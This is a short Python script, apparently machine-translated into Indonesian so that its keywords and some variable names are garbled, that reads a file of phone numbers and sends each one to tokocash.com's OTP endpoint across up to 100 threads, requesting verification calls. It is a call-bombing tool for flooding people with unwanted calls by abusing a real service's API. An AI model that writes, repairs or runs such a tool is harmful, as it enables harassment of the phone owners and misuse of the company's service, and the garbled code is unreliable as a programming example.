cetak ( "" " \
   __ __________ __
  / | / / _ / _ \ / / | Buat Cincin!
/ / | _ / // //, _ / _ / | Penulis: P4kL0nc4t
/ _ / / _ / ___ / _ / | _ (_) | https://github.com/p4kl0nc4t
"" " )
utas impor
permintaan impor
impor sys
coba :
	file  = sys.argv [ 1 ]
kecuali :
	print ( " usage: {} <numbers_list> " .format (sys.argv [ 0 ]))
	sys.exit ()
numbers =  open (sys.argv [ 1 ], " r " ) .readlines ()
hitung =  0
prosesc =  0
running_threads =  0
print_used =  Salah
max_threads =  100
print ( " [----- info -----]: baca {} angka dari {} " .format ( len (angka), file ))
 proses def ( angka ):
	global running_threads
	proses globalc
	print_used global
	running_threads + =  1
	number = number.rstrip ()
	url =  " https://www.tokocash.com/oauth/otp "
	data = { " msisdn " : number.rstrip (), " accept " : " call " }
	header = { " X-Diminta-Dengan " : " XMLHttpRequest " }
	r = requests.post (url, data = data, header = header)
	saat print_used:
		lulus
	print_used =  Benar
	print ( " \ r [0x "  +  str (thread.get_ident ()) +  " ]: "  + number +  " (status: "  + r.json () [ ' code ' ] +  " ) " )
	print_used =  Salah
	processc + =  1
	running_threads - =  1
	kembali  1
untuk nomor dalam angka:
	saat running_threads > = max_threads:
		lulus
	jika nomor ==  " "  atau angka [ 0 ] ==  " ; " : lanjutkan
	hitung + =  1
	thread.start_new_thread (proses, (angka,))
while processc ! = count:
	lulus
print ( " [----- done -----]: Sukses Kirim Semua Ke Tidak Ada Daftar " )
sys.exit ()